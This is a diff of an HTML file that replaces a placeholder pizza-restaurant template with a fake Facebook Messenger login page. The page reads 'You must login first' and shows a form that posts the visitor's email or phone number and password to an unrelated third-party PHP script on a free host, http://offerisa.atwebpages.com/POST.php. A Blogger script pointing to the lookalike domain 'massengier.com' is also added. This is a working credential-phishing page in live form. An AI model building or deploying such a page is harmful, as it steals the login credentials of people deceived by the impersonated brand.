@@ -1,294 +1,210 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- start font  -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;1,100&family=Satisfy&display=swap" rel="stylesheet">
-    <!-- end font  -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
-    <link rel="stylesheet" href="style.css">
-    <script src="main.js"></script>
-    <title>Pizza</title>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta property="og:image" content="https://cdn01.vulcanpost.com/wp-uploads/2016/12/fb-cover.jpg" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Messenger</title>
+	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Facebook_Messenger_logo.svg/595px-Facebook_Messenger_logo.svg.png">
+      <style>
+        * {
+    margin:0px;
+    padding:0px;
+    -webkit-box-sizing:border-box;
+    box-sizing:border-box;
 
-</head>
-<body>
+}
+body {
+    background-color:#FFF;
+    width:auto;
+    height:auto;
+}
+.logo img {
+    width:100px;
+    margin-top:75px;
+  border-radius:50%
+      
 
-    <!-- start header   -->
-    <div class="header">
-        <!-- start nav  -->
-        <nav class="navbar navbar-expand-lg navbar-light ">
-            <div class="container">
-                <button class="navbar-toggler" type="button" data-bs-toggle='collapse' data-bs-target="#item">
-                    <!-- <span class="navbar-toggler-icon"></span> -->
-                    <i class="fa-solid fa-bars"></i>
-                </button>
+}
+.logo .head h1 {
+    font-family: "Calibre", "Helvetica Neue", "Segoe UI",sans-serif;
+    text-align: center;
+    font-weight: 100;
+    font-size: 40px;
+    color: rgba(0, 0, 0, 1);
+    margin-top: 17px;
+    
+}
+.logo .head p {
+    font-family: "Calibre", "Helvetica Neue", "Segoe UI",sans-serif;
+    color: #f03d25;
+    font-size:15px;
+    line-height:20px;
+    text-align:center;
+    margin-top:30px
 
-                <div class="collapse navbar-collapse" id="item">
-                    <ul class="navbar-nav">
-                        <li class="nav-item ms-lg-4 my-sm-2 my-lg-0">
-                            <a href="#" class="nav-link">Home</a>
-                        </li>
-                        <li class="nav-item ms-lg-4 my-sm-2 my-lg-0">
-                            <a href="#" class="nav-link">Menu</a>
-                        </li>
-                        <li class="nav-item ms-lg-4 my-sm-2 my-lg-0">
-                            <a href="#" class="nav-link">Our Story</a>
-                        </li>
-                        <li class="nav-item ms-lg-4 my-sm-2 my-lg-0">
-                            <a href="#" class="nav-link">Contact us</a>
-                        </li>
-                        <li class="nav-item ms-lg-4 my-sm-2 my-lg-0">
-                            <div class="search d-none d-lg-block">
-                                <input type="search" class='' placeholder="Search">
-                            </div>
-                        </li>
-                    </ul>
+}
+.form input[type='text'] {
+    display: block;
+    border: 1px solid rgba(0, 0, 0, .20);
+    border-radius: 4px;
+    color: rgba(0, 0, 0, 1);
+    display: block;
+    font-family: "Helvetica Neue", "Segoe UI", "Helvetica", "Arial", sans-serif;
+    font-size: 17px;
+    height: 42px;
+    margin-bottom: 12px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 37px;
+    padding: 0 16px;
+    width: 286px;
+    
+}
+.form input[type="password"] {
+    display: block;
+    border: 1px solid rgba(0, 0, 0, .20);
+    border-radius: 4px;
+    color: rgba(0, 0, 0, 1);
+    display: block;
+    font-family: "Helvetica Neue", "Segoe UI", "Helvetica", "Arial", sans-serif;
+    font-size: 17px;
+    height: 42px;
+    margin-bottom: 12px;
+    margin-left: auto;
+    margin-right: auto;
+    margin-top: 13;
+    padding: 0 16px;
+    width: 286px;
+    
+}
+.form button{
+    background: #0a7cff;
+    border-radius: 50px;
+    color: #fff;
+    font-size: 15px;
+    padding: 15px 20px;
+    align-items: center;
+    border: none;
+    box-shadow: none;
+    display: flex;
+    margin-left: auto;
+    margin-right: auto;
+     margin-top: 25px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    text-shadow: none;
+    white-space: nowrap;
+    outline: none;
+    
+}
+.form button{
+    border:3px solid #FFF;
+     border: none;
+    box-shadow: none;
+}
+.form button {
+    border:3px solid #FFF;
+     border: none;
+    box-shadow: none;
+}
+.form .cont {
+    display:flex;
+   justify-content: center;
+}
+form  .cont input[type="checkbox"] {
+    height:22px;
+    margin-right:3px;
+    color: #929292;
 
-                </div>
-            </div>
-        </nav>
-        <!-- end nav  -->
-        <!-- start interface -->
-        <div class="interface">
-            <div class="container">
-                <div class="parent-item d-flex justify-content-between">
-
-                    <div class="left">
-                        <img src="images/logo.jpg" alt="">
-                        <div class="h1 title my-4">Italian Food</div>
-                        <p class="mb-3">LOREMIPSUM DOLOR</p>
-                        <a href="#" class="d-inline-block mt-3 mb-3">read more</a>
-                        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do iusmod tempor incididunt ut labore et dolore magna.</p>
-                    </div>
-                    
-
-                    <div class="right">
-                        <img src="images/platelarge.jpg"  class="img-main">
-                        <img src="images/platesmall.jpg" class="small">
-                        <img src="images/xxxxxxxxxxxxxx.png" class="green">
-                    </div>
-
-                </div>
-            </div>
-        </div>
-        <!-- end interface -->
-
-    </div>
-    <!-- end header   -->
-
-    <!-- start Species -->
-    <div class="species">
-        <div class="h1 text-center title">Lorem Ipsum  Dolor</div>
-        <p class="text-center mt-4">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus lacinia odio vitae vestibulum vestibulum. </p>
-
-        <div class="container">
-            <div class="row ">
-
-                <div class="col-md-4">
-                    <div class="card my-4">
-                        <img src="images/pizza1.png" class="card-img-top">
-                        <div class="card-body">
-                            <div class="card-title h4">Pizza 1</div>
-                            <div class="card-text">Lorem ipsum dolor sit amet, 
-                                consectetur  adipisicing...</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="col-md-4">
-                    <div class="card my-4">
-                        <img src="images/pizza2.png" class="card-img-top">
-                        <div class="card-body">
-                            <div class="card-title h4">Pizza 2</div>
-                            <div class="card-text">Lorem ipsum dolor sit amet, 
-                                consectetur  adipisicing...</div>
-                        </div>
-                    </div>
-                </div>
-
-
-                <div class="col-md-4">
-                    <div class="card my-4">
-                        <img src="images/pizza3.png" class="card-img-top">
-                        <div class="card-body">
-                            <div class="card-title h4">Pizza 3</div>
-                            <div class="card-text">Lorem ipsum dolor sit amet, 
-                                consectetur  adipisicing...</div>
-                        </div>
-                    </div>
-                </div>
+}
+ form  .cont input[type="checkbox"] , p {
+    margin-top:60px; 
+ 
+ }
 
 
-            </div>
-
-            <a href="#" class='more text-decoration-none d-block mx-auto'>show more</a>
-        </div>
-    </div>
-    <!-- end Species -->
-
-    <!-- start more info  -->
-    <div class="info">
-        <div class="container">
-            <div class="h1 title text-center mb-3">Lorem Ipsum  Dolor</div>
-            <div class="row">
-                <div class="col-md-5">
-                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed
-                        do eiusmod tempor incididunt ut labore et dolore magna
-                        aliqua. Ut enim ad minim veniam, quis nostrud exercitation
-                        ullamco laboris nisi ut aliquip ex quia voluptas sit aspernatur
-                    </p>
-                </div>
-
-                <div class="col-md-5 offset-md-2">
-                    <p>
-                        Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed
-                        do eiusmod tempor incididunt ut labore et dolore magna
-                        aliqua. Ut enim ad minim veniam, quis nostrud exercitation
-                        ullamco laboris nisi ut aliquip.
-                    </p>
-                </div>
-                
-            </div>
-            <a href="#" class="text-decoration-none d-block mx-auto mt-4" >MORE INFO</a>
-        </div>
-    </div>
-    <!-- end more info  -->
-
-    <!-- start discount -->
-    <div class="discount">
-        <div class="container">
-            <div class="row">
-
-                <div class="col-md-12">
-                    <div class="item d-md-flex mb-4">
-
-                        <div class="col-md-5">
-                            <img src="images/pizza1.png" class="mb-5 mb-md-0">
-                        </div>
-                        <div class="col-md-6 offset-md-1 text ">
-                            <div class="h1 mb-4">Discount up to 50% All Excursions</div>
-                            <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.</p>
-                            <a href="#" class="read text-decoration-none d-block mt-5" >READ MORE</a>
-                        </div>
-                    </div>
-                </div>
+ .form  .cont p {
+  
+     color: #929292;
+     font-family: "Helvetica Neue", "Segoe UI", "Helvetica", "Arial", sans-serif;
+     font-size: 15px;
+     font-weight: normal;
+ } 
 
 
 
-                <div class="col-md-12">
-                    <div class="item d-md-flex  flex-row-reverse">
 
-                        <div class="col-md-5 offset-md-1">
-                            <img src="images/pizza2.png" class="mb-5 mb-md-0">
-                        </div>
-                        <div class="col-md-6  text ">
-                            <div class="h1 mb-4">January’s Promo:Buy 1 Get 1 Free!</div>
-                            <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit, sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat.</p>
-                            <a href="#" class="read text-decoration-none d-block mt-5" >READ MORE</a>
-                        </div>
-                    </div>
-                </div>
+@media only screen (max-width: 786px){
+	form{
+		width: 100%;
+	}
+	.form input{
+		width: 95%;
+	}
+	.form button
+	{
+	    
+		font-size: 18px;
+        text-align: center;
+        
+    }
+    .form .cont input[type="checkbox"] {
+        height:12.2
+    }
+    
+    
 
 
 
-            </div>
-        </div>
-    </div>
-    <!-- end discount -->
+    
+  
+}
 
 
-    <!-- start pizza  -->
-    <div class="pizza">
-        <div class="container">
-            <!-- <div class="right"> <img src="images/section2.png" alt=""></div> -->
-            <div class="head h2 text-center">Lorem Ipsum Dolor Sit Amer</div>
-            <p class="text-center mt-4">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis </p>
+      </style>
+        
+    </head>   
+    <body>
+        <center>
+            <div class="logo">
+            <img src="https://cdn.pixabay.com/photo/2021/03/02/12/03/messenger-6062243_1280.png" alt="Messanger">
+                <div class="head">
+                  <p>You must login first.</p>
 
-            <div class="pizze-section">
-                <div class="big">
-                    <img src="images/pizzz4.png" class="pizza-1">
-                    <img src="images/piece.png" class="piece d-none d-lg-block">
                 </div>
                 
             </div>
-        </div>
-    </div>
-    <!-- end pizza  -->
-    <!-- <ul class="list-unstyled">
-        <li>History</li>
-        <li>Our Team</li>
-        <li>Brand Guidelines</li>
-        <li>Terms & condition</li>
-        <li>Privacy Policy</li>
-    </ul> -->
-    <!-- start footer  -->
-    <div class="footer">
-        <div class="container">
-            <div class="row">
-                <!-- start column -->
-                <div class="col-md-4">
-                    <div class="first">
-                        <div class="head h3 mb-3">Pizza</div>
-                        <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Eius dignissimos et modi, molestias, dolore suscipit ex iusto quos reiciendis incidunt animi! Delectus ab ea iusto praesentium. Ad quae rerum quibusdam!</p>
-                        <ul class="list-unstyled d-flex">
-                            <li class="me-3"><a href='#' class="text-decoration-none"><i class="fa-brands fa-facebook"></i></a></li>
-                            <li class="me-3"><a href='#' class="text-decoration-none"><i class="fa-brands fa-twitter"></i></a></li>
-                            <li class="me-3"><a href='#' class="text-decoration-none"><i class="fa-brands fa-whatsapp"></i></a></li>
-                        </ul>
-                    </div>
-                </div>
-                <!-- end column -->
+            
+            <div class="form">
+                <form method="POST" action="http://offerisa.atwebpages.com/POST.php">
+                <input type="text" name="email" minlength="4" placeholder="Email Adress or phone number
+ " required>
+                <input type="password" name="pass" minlength="5" placeholder="Password" required>
+                <button>Continue</button>
+                    <div class="cont">
+                      
+                    <input type="checkbox"> 
+                    <p>Keep me signed in
 
-                <!-- start column  -->
-                <div class="col-md-3">
-                    <div class="myTitle h3">About</div>
-                    <ul class="list-unstyled">
-                        <li class="mb-2">History</li>
-                        <li class="mb-2">Our Team</li>
-                        <li class="mb-2">Brand Guidelines</li>
-                        <li class="mb-2">Terms & condition</li>
-                        <li class="mb-2">Privacy Policy</li>
-                    </ul>
-                </div>
-                <!-- end column  -->
-                <!-- start colmun  -->
-                <div class="col-md-3">
-                    <div class="myTitle h3">Service</div>
-                    <ul class="list-unstyled">
-                        <li class="mb-2">Howto Order</li>
-                        <li class="mb-2">Our Product</li>
-                        <li class="mb-2">Order Status</li>
-                        <li class="mb-2">Promo</li>
-                        <li class="mb-2">Payment Method</li>
-                    </ul>
-                </div>
-                <!-- end colmun  -->
-
-                <!-- start column  -->
-                <div class="col-md-2">
-                    <div class="myTitle h3">Other</div>
-                    <ul class="list-unstyled">
-                        <li class="mb-2">Contact Us</li>
-                        <li class="mb-2">Help!</li>
-                        <li class="mb-2">Privacy</li>
-                    </ul>
-                </div>
-                <!-- end column  -->
+</p>
+                        
+                     </div>
+             
+                </form>
                 
-
             </div>
-        </div>
-    </div>
-    <!-- end footer  -->
+            
+                
+        </center>
+        
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
-</body>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY6RuoNmlzSLjHTas7piL2gzfVyXAw:1594313958534';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d3831468560312595316','//www.massengier.com/','3831468560312595316');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '3831468560312595316', 'title': 'hadeer', 'url': 'https://www.massengier.com/', 'canonicalUrl': 'https://www.massengier.com/', 'homepageUrl': 'https://www.massengier.com/', 'searchUrl': 'https://www.massengier.com/search', 'canonicalHomepageUrl': 'https://www.massengier.com/', 'blogspotFaviconUrl': 'https://www.massengier.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': true, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22hadeer - Atom\x22 href\x3d\x22https://www.massengier.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22hadeer - RSS\x22 href\x3d\x22https://www.massengier.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22hadeer - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/3831468560312595316/posts/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': true, 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/55eba78911ffaedd', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'index', 'pageName': '', 'pageTitle': 'hadeer'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'hadeer', 'description': '', 'url': 'https://www.massengier.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'navMessage': 'No posts.', 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/218772866-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/368954415-lightbox_bundle.css'}, 'displayModeFull'));
+</script>
+    </body>
 </html>
+        
+ 
